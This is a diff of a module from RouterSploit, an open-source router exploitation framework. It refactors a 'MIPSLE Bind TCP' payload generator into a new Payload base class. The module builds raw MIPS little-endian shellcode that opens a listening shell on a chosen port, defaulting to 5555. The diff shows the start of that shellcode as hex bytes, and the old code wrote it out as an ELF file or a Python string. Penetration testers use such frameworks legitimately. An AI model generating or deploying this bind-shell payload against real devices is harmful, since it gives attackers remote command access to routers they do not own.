@@ -1,16 +1,11 @@
 from routersploit import (
     exploits,
-    mipsle,
+    payloads,
     validators,
-    print_success,
-    print_status,
-    print_error,
-    print_info,
-    random_text
 )
 
 
-class Exploit(exploits.Exploit, mipsle.Mipsle):
+class Exploit(payloads.Payload):
     __info__ = {
         'name': 'MIPSLE Bind TCP',
         'authors': [
@@ -21,35 +16,11 @@ class Exploit(exploits.Exploit, mipsle.Mipsle):
         ],
     }
 
-    port = exploits.Option(5555, 'Bind port', validators=validators.integer)
+    architecture = "mipsle"
+    port = exploits.Option(5555, 'Bind Port', validators=validators.integer)
 
-    output = exploits.Option('python', 'Output type: elf/python')
-    filepath = exploits.Option('', 'Output file to write (only for elf type)')
-
-    def __init__(self):
-        self.filepath = "/tmp/{}".format(random_text(8))
-
-    def run(self):
-        print_status("Generating MIPSLE Bind TCP payload")
-        print_status("Bind Port: {}".format(self.port))
-
-        self.generate(self.port)
-
-        if self.output== "elf":
-            with open(self.filepath, 'w+') as f:
-                print_status("Building ELF payload")
-                content = self.generate_elf()
-
-                print_success("Saving file {}".format(self.filepath))
-                f.write(content)
-
-        elif self.output == "python":
-            print_success("Building payload for python")
-            content = self.generate_python()
-            print_info(content)        
-
-    def generate(self, bind_port):
-        bind_port = self.convert_port(bind_port)
+    def generate(self, port):
+        bind_port = self.convert_port(port)
 
         self.payload = (
             "\xe0\xff\xbd\x27" +        # addiu   sp,sp,-32
